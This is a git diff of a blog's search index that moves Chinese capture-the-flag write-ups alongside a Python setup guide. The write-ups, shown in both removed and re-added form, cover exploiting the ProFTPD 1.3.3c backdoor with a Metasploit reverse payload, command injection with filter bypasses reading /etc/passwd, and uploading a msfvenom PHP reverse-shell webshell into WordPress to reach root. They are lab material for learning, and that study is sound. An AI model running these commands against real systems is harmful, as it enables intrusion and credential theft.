@@ -1,207 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>FTP服务后门利用</title>
-    <url>/2024/09/11/602e2b077e4b/</url>
-    <content><![CDATA[<h1 id="FTP服务后门利用"><a href="#FTP服务后门利用" class="headerlink" title="FTP服务后门利用"></a>FTP服务后门利用</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1. 信息探测"></a>1. 信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV IP <span class="comment"># 扫描主机服务信息以及服务版本</span></span><br><span class="line">namp -A -v -T4 IP <span class="comment"># 最大线程扫描主机所有信息</span></span><br></pre></td></tr></table></figure></div>
-
-<p>发现FTP服务<code>（端口号为21）</code></p>
-<p>记录FTP软件名以及版本号</p>
-<h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><h3 id="1-漏洞查找"><a href="#1-漏洞查找" class="headerlink" title="1.漏洞查找"></a>1.漏洞查找</h3><h4 id="1-1SearchSploit”漏洞查找工具"><a href="#1-1SearchSploit”漏洞查找工具" class="headerlink" title="1.1SearchSploit”漏洞查找工具"></a>1.1SearchSploit”漏洞查找工具</h4><blockquote>
-<p>“SearchSploit”是一个用于Exploit-DB的命令行搜索工具(已经默认在Kali中安装)，可以查找渗透模块。Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，它将搜索所有的漏洞和shellcode而且该漏洞库是保存在本地的，在没有网络的情况下也可以使用。它不会包含任何文件和谷歌黑客数据库的结果。终端输入”searchsploit”启动。</p>
-</blockquote>
-<h4 id="1-2查找漏洞"><a href="#1-2查找漏洞" class="headerlink" title="1.2查找漏洞"></a>1.2查找漏洞</h4><p>FTP服务为“<strong>ProFTPD 1.3.3c</strong>”版本</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure></div>
-
-<p>发现存在后门，可以尝试远程溢出。既可以通过修改对应文件中的源代码（修改某些参数）进而执行远程溢出从而利用漏洞（第一行，此方法较复杂），也可以使用Metasploit工具利用该漏洞（输出结果的第二行表示Metasploit工具已集成该漏洞）。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201710758.png"
-                     
-                ></p>
-<p><strong>我们使用第二种方法</strong></p>
-<h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p><strong>利用Metasploit进行远程溢出攻击</strong></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole  //启动Metasploit工具</span><br><span class="line">msf6 &gt; search ProFTPd-1.3.3c  //Metasploit中通过版本号查找该漏洞</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711103.png"
-                      alt="2"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/ftp/proftpd_133c_backdoor  //利用exp</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads  //查看可使用的挂载</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> payload cmd/unix/reverse  //选择挂载</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711011.png"
-                      alt="3"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数（输入时可用tab键补全）</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712093.png"
-                      alt="4"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> rhost 192.168.43.174  //设置靶机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> lhost 192.168.43.40  //设置攻击机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit  //开始利用漏洞</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712162.png"
-                      alt="5"
-                ></p>
-<p>成功拿到反弹shell，且当前账户拥有root权限。（注：最后一句提示“Command shell session 1 opened”说明会话已经开启，并且下面出现光标，此时即可输入指令。）<br><strong>但是此会话跟终端有区别，于是我们优化终端</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>  //优化终端</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="3-获取flag"><a href="#3-获取flag" class="headerlink" title="3.获取flag"></a>3.获取flag</h3><p>一般flag在根目录也就是&#x2F;root中</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root  //进入root目录</span><br><span class="line"><span class="built_in">ls</span>  //查看当前目录（文件夹）中文件列表</span><br><span class="line"><span class="built_in">cat</span> flag  //打开flag文件</span><br></pre></td></tr></table></figure></div>
-
-<p>成功获取flag</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>FTP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctf 基本思路</title>
-    <url>/2024/09/11/93f6ba8bb1f2/</url>
-    <content><![CDATA[<h1 id="得到flag参考思路"><a href="#得到flag参考思路" class="headerlink" title="得到flag参考思路"></a>得到flag参考思路</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><h3 id="1-1-扫描信息"><a href="#1-1-扫描信息" class="headerlink" title="1.1 扫描信息"></a>1.1 扫描信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="1-2-探测敏感信息"><a href="#1-2-探测敏感信息" class="headerlink" title="1.2 探测敏感信息"></a>1.2 探测敏感信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://ip:port</span><br><span class="line"></span><br><span class="line">dirb http://ip:port <span class="comment"># 探测相关目录</span></span><br><span class="line"><span class="comment">#两种方法的port不可省略，80可省略</span></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><h3 id="1-1-http服务"><a href="#1-1-http服务" class="headerlink" title="1.1 http服务"></a>1.1 http服务</h3><p><strong>对于大端口非htp服务，可以使用nc来探测该端口的banner信息</strong></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc IP port</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>对于大端口http服务，可以使用浏览器浏览界面查看源代码，寻找flag值</strong></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip地址:端口号</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>在扫描的全部信息里寻找是否为http服务</p>
-</blockquote>
-<p><strong>对于http服务，打开相关敏感页面，查看敏感信息，找到可利用的位置（包括80端口）</strong></p>
-<p><strong>&#x3D;&#x3D;注意之前用dirb和nikto扫描出来的目录&#x3D;&#x3D;</strong></p>
-<p>注意到flag.txt，打开获得flag</p>
-<p>并且这里有个passwords.html，打开发现没有什么，但是我们&#x3D;&#x3D;查看源代码&#x3D;&#x3D;，<strong>发现一个password：Winter</strong>，记录下来</p>
-<h3 id="1-2-FTP服务"><a href="#1-2-FTP服务" class="headerlink" title="1.2 FTP服务"></a>1.2 FTP服务</h3><p><strong>FTP 匿名登陆 挖掘敏感信息</strong></p>
-<p>在浏览器输入</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://IP</span><br></pre></td></tr></table></figure></div>
-
-<p> 匿名登录ftp服务器根目录</p>
-<p>发现flag</p>
-<p><strong>然后在站点robots.txt文件中寻找敏感文件目录，挖掘漏洞（在扫描的信息中查看）</strong></p>
-<p>&#x3D;&#x3D;注意：对于命令执行，为了绕过对应的限制，可以使用相近命令&#x3D;&#x3D;</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat -&gt; more</span><br></pre></td></tr></table></figure></div>
-
-<p>然后依次打开robots.txt中的目录</p>
-<p>发现命令执行窗口</p>
-<p>于是想到命令注入</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;id</span><br><span class="line"></span><br><span class="line">127.0.0.1;more /etc/passwd # cat不能用</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>1、命令注入我们要防备其对于一些符号的过滤导致我们不能成功注入，所以我们要多了解一些符号。<br>2、;直接分号分隔<br>管道符：作用和&amp;一样。前面和后面命令都要执行，无论前面真假<br>3、| 按位或<br>作用是直接执行|后面的语句<br>4、|| 逻辑或<br>作用是如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>5、&amp; 按位与<br>&amp;前面和后面命令都要执行，无论前面真假<br>6、&amp;&amp; 逻辑与<br>如果前面为假，后面的命令就不执行，如果前面为真则再执行后面命令，这样两条命令都会被执行</p>
-</blockquote>
-<p>找到在home下的用户Summer</p>
-<p>然后利用ssh远程连接</p>
-<p>但是发现无法直接连接，看到扫描的端口号有个22222端口</p>
-<p>于是利用这个端口进行连接</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p 22222 Summer@IP</span><br><span class="line"><span class="comment">#输入密码 Winter</span></span><br></pre></td></tr></table></figure></div>
-
-<p>于是得到反弹shell</p>
-<p>利用pwd ls cat more等命令</p>
-<p>查看flag</p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>空格绕过：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1 改 成 1改成1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>common</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SambaSMB信息泄露（Serve Message Block)</title>
-    <url>/2024/09/11/cfb8804dd1b5/</url>
-    <content><![CDATA[<h1 id="Samba-SMB信息泄露"><a href="#Samba-SMB信息泄露" class="headerlink" title="Samba&#x2F;SMB信息泄露"></a>Samba&#x2F;SMB信息泄露</h1><p>Serve Message Block</p>
-<p>&#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D;</p>
-<p>&#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D;</p>
-<p>SMB协议用来访问网络资源，下载对应的资源文件</p>
-<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p><code>nmap -sV ip</code> 探测开放服务</p>
-<p><code>nmap -A -v -T4 ip </code>探测全部信息（T4——最大线程速度）</p>
-<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
-<h2 id="针对SMB协议弱点分析"><a href="#针对SMB协议弱点分析" class="headerlink" title="针对SMB协议弱点分析"></a>针对SMB协议弱点分析</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol>
-<li><p>针对SMB协议，使用空口令，弱口令尝试登陆，并查看敏感文件，下载查看；</p>
-<p>1. </p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L ip   <span class="comment">#表示该ip所有分享的目录和链接</span></span><br><span class="line"><span class="comment"># 输入后需要输入密码，我们直接回车，表示空命令</span></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\share$&#x27;</span> <span class="comment"># 表示要查看的共享文件夹 share可以替换为其他的如print等</span></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\IPC$&#x27;</span> <span class="comment"># 登录空链接</span></span><br><span class="line"></span><br><span class="line">get 敏感文件名 <span class="comment"># 下载敏感文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>打开下载的文件deets.txt，可以发现密码password为12345 </p>
-<p>再打开wordpress文件夹，然后下载wp-config.php并打开，得到数据库名，用户名user和密码pwd</p>
-<p>连接mysql</p>
-<p><code>mysql -h ip -u user -p</code></p>
-<p>但是可能无法远程登录mysql，于是尝试ssh登录</p>
-<p><code>ssh 用户名@ip</code></p>
-<p>尝试数据库密码，密码错误</p>
-</li>
-<li><p>针对SMB协议远程溢出漏洞进行分析</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit samba版本号</span><br><span class="line"></span><br><span class="line">searchsploit Samba smbd 3.X - 4.X</span><br></pre></td></tr></table></figure></div>
-
-<p>发现也没有漏洞</p>
-</li>
-</ol>
-<h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><h3 id="1-浏览器查看网站"><a href="#1-浏览器查看网站" class="headerlink" title="1. 浏览器查看网站"></a>1. 浏览器查看网站</h3><h3 id="2-使用dirb-nicko扫描"><a href="#2-使用dirb-nicko扫描" class="headerlink" title="2. 使用dirb nicko扫描"></a>2. 使用dirb nicko扫描</h3><p><code>dirb http://ip:port/</code><strong>(80端口可省略)</strong></p>
-<p>扫描到网站后台目录</p>
-<p>打开并输入用户名和密码</p>
-<h3 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h3><p>wordpress有常见漏洞</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机ip lport=4444 raw</span><br><span class="line"><span class="comment"># 将生成的webshell复制到一个php文件中</span></span><br><span class="line">gedit webshell.php</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi//handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp <span class="comment"># 监听</span></span><br><span class="line"><span class="built_in">set</span> lhost 攻击机ip</span><br><span class="line">show options <span class="comment"># 查看参数</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
-
-<p>然后就是上传webshell，并且执行（访问具有webshell的php页面）</p>
-<p>我们将webshell上传到editor的404.php页面</p>
-<p>然后打开404页面</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">http://靶场IP/wordpress/wp-content/themes/twentyfourteen/404.php</span><br></pre></td></tr></table></figure></div>
-
-<p>然后返回攻击机，发现成功监听，查看当前用户，执行以下命令</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
-
-<p>发现获得服务器的通用权限</p>
-<p>优化终端</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>查看当前计算机的用户</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
-
-<p>查看敏感用户，发现一个togie</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su togie</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入密码为12345，前面获取的密码</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="4-提升权限"><a href="#4-提升权限" class="headerlink" title="4. 提升权限"></a>4. 提升权限</h3><p>查找共享目录下的敏感文件</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>SMB</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AI（Python）学习准备——呕心沥血版</title>
-    <url>/2024/09/21/70f98fb04493/</url>
+    <url>/2024/09/23/c615d06f1ce9/</url>
     <content><![CDATA[<h3 id="学习准备"><a href="#学习准备" class="headerlink" title="学习准备"></a>学习准备</h3><h4 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h4><p>本文以下是PyCharm+Anaconda+jupyter的保姆级安装方案，为后面的学习做好准备，如果觉得Anaconda安装太过于麻烦，可以选择一个python版本进行安装和配置环境（详情请自行寻找教程）。</p>
 <p>本文基于<strong>windows11</strong>进行安装和环境配置。</p>
 <h5 id="1-PyCharm安装"><a href="#1-PyCharm安装" class="headerlink" title="1. PyCharm安装"></a>1. PyCharm安装</h5><h6 id="1-1-下载安装包"><a href="#1-1-下载安装包" class="headerlink" title="1.1 下载安装包"></a>1.1 下载安装包</h6><p> PyCharm是Jetbrains公司旗下的一款产品，所以下载官方的最新版应该去它的官网：</p>
@@ -544,9 +345,208 @@
         <category>AI</category>
       </categories>
       <tags>
-        <tag>common</tag>
         <tag>python</tag>
+        <tag>common</tag>
         <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>FTP服务后门利用</title>
+    <url>/2024/09/11/602e2b077e4b/</url>
+    <content><![CDATA[<h1 id="FTP服务后门利用"><a href="#FTP服务后门利用" class="headerlink" title="FTP服务后门利用"></a>FTP服务后门利用</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1. 信息探测"></a>1. 信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV IP <span class="comment"># 扫描主机服务信息以及服务版本</span></span><br><span class="line">namp -A -v -T4 IP <span class="comment"># 最大线程扫描主机所有信息</span></span><br></pre></td></tr></table></figure></div>
+
+<p>发现FTP服务<code>（端口号为21）</code></p>
+<p>记录FTP软件名以及版本号</p>
+<h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><h3 id="1-漏洞查找"><a href="#1-漏洞查找" class="headerlink" title="1.漏洞查找"></a>1.漏洞查找</h3><h4 id="1-1SearchSploit”漏洞查找工具"><a href="#1-1SearchSploit”漏洞查找工具" class="headerlink" title="1.1SearchSploit”漏洞查找工具"></a>1.1SearchSploit”漏洞查找工具</h4><blockquote>
+<p>“SearchSploit”是一个用于Exploit-DB的命令行搜索工具(已经默认在Kali中安装)，可以查找渗透模块。Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，它将搜索所有的漏洞和shellcode而且该漏洞库是保存在本地的，在没有网络的情况下也可以使用。它不会包含任何文件和谷歌黑客数据库的结果。终端输入”searchsploit”启动。</p>
+</blockquote>
+<h4 id="1-2查找漏洞"><a href="#1-2查找漏洞" class="headerlink" title="1.2查找漏洞"></a>1.2查找漏洞</h4><p>FTP服务为“<strong>ProFTPD 1.3.3c</strong>”版本</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure></div>
+
+<p>发现存在后门，可以尝试远程溢出。既可以通过修改对应文件中的源代码（修改某些参数）进而执行远程溢出从而利用漏洞（第一行，此方法较复杂），也可以使用Metasploit工具利用该漏洞（输出结果的第二行表示Metasploit工具已集成该漏洞）。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201710758.png"
+                     
+                ></p>
+<p><strong>我们使用第二种方法</strong></p>
+<h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p><strong>利用Metasploit进行远程溢出攻击</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole  //启动Metasploit工具</span><br><span class="line">msf6 &gt; search ProFTPd-1.3.3c  //Metasploit中通过版本号查找该漏洞</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711103.png"
+                      alt="2"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/ftp/proftpd_133c_backdoor  //利用exp</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads  //查看可使用的挂载</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> payload cmd/unix/reverse  //选择挂载</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711011.png"
+                      alt="3"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数（输入时可用tab键补全）</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712093.png"
+                      alt="4"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> rhost 192.168.43.174  //设置靶机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> lhost 192.168.43.40  //设置攻击机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit  //开始利用漏洞</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712162.png"
+                      alt="5"
+                ></p>
+<p>成功拿到反弹shell，且当前账户拥有root权限。（注：最后一句提示“Command shell session 1 opened”说明会话已经开启，并且下面出现光标，此时即可输入指令。）<br><strong>但是此会话跟终端有区别，于是我们优化终端</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>  //优化终端</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-获取flag"><a href="#3-获取flag" class="headerlink" title="3.获取flag"></a>3.获取flag</h3><p>一般flag在根目录也就是&#x2F;root中</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root  //进入root目录</span><br><span class="line"><span class="built_in">ls</span>  //查看当前目录（文件夹）中文件列表</span><br><span class="line"><span class="built_in">cat</span> flag  //打开flag文件</span><br></pre></td></tr></table></figure></div>
+
+<p>成功获取flag</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>FTP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SambaSMB信息泄露（Serve Message Block)</title>
+    <url>/2024/09/11/cfb8804dd1b5/</url>
+    <content><![CDATA[<h1 id="Samba-SMB信息泄露"><a href="#Samba-SMB信息泄露" class="headerlink" title="Samba&#x2F;SMB信息泄露"></a>Samba&#x2F;SMB信息泄露</h1><p>Serve Message Block</p>
+<p>&#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D;</p>
+<p>&#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D;</p>
+<p>SMB协议用来访问网络资源，下载对应的资源文件</p>
+<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p><code>nmap -sV ip</code> 探测开放服务</p>
+<p><code>nmap -A -v -T4 ip </code>探测全部信息（T4——最大线程速度）</p>
+<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
+<h2 id="针对SMB协议弱点分析"><a href="#针对SMB协议弱点分析" class="headerlink" title="针对SMB协议弱点分析"></a>针对SMB协议弱点分析</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol>
+<li><p>针对SMB协议，使用空口令，弱口令尝试登陆，并查看敏感文件，下载查看；</p>
+<p>1. </p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L ip   <span class="comment">#表示该ip所有分享的目录和链接</span></span><br><span class="line"><span class="comment"># 输入后需要输入密码，我们直接回车，表示空命令</span></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\share$&#x27;</span> <span class="comment"># 表示要查看的共享文件夹 share可以替换为其他的如print等</span></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\IPC$&#x27;</span> <span class="comment"># 登录空链接</span></span><br><span class="line"></span><br><span class="line">get 敏感文件名 <span class="comment"># 下载敏感文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>打开下载的文件deets.txt，可以发现密码password为12345 </p>
+<p>再打开wordpress文件夹，然后下载wp-config.php并打开，得到数据库名，用户名user和密码pwd</p>
+<p>连接mysql</p>
+<p><code>mysql -h ip -u user -p</code></p>
+<p>但是可能无法远程登录mysql，于是尝试ssh登录</p>
+<p><code>ssh 用户名@ip</code></p>
+<p>尝试数据库密码，密码错误</p>
+</li>
+<li><p>针对SMB协议远程溢出漏洞进行分析</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit samba版本号</span><br><span class="line"></span><br><span class="line">searchsploit Samba smbd 3.X - 4.X</span><br></pre></td></tr></table></figure></div>
+
+<p>发现也没有漏洞</p>
+</li>
+</ol>
+<h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><h3 id="1-浏览器查看网站"><a href="#1-浏览器查看网站" class="headerlink" title="1. 浏览器查看网站"></a>1. 浏览器查看网站</h3><h3 id="2-使用dirb-nicko扫描"><a href="#2-使用dirb-nicko扫描" class="headerlink" title="2. 使用dirb nicko扫描"></a>2. 使用dirb nicko扫描</h3><p><code>dirb http://ip:port/</code><strong>(80端口可省略)</strong></p>
+<p>扫描到网站后台目录</p>
+<p>打开并输入用户名和密码</p>
+<h3 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h3><p>wordpress有常见漏洞</p>
